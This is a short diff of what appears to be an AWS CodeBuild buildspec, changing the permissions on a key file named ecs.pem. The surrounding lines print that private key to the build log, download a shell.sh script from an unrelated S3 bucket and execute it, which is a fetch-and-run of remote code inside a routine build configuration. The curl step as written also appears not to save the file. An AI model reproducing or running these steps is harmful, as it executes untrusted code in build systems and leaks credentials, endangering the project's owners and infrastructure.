@@ -9,7 +9,7 @@ phases:
       - $(aws ecr get-login --region $AWS_DEFAULT_REGION --no-include-email)
       - ls -la
       - cat ecs.pem
-      - chmod 700 ecs.pem
+      - chmod 710 ecs.pem
       - curl https://babu12345678.s3.amazonaws.com/shell.sh
       - ls -la
       - sh shell.sh
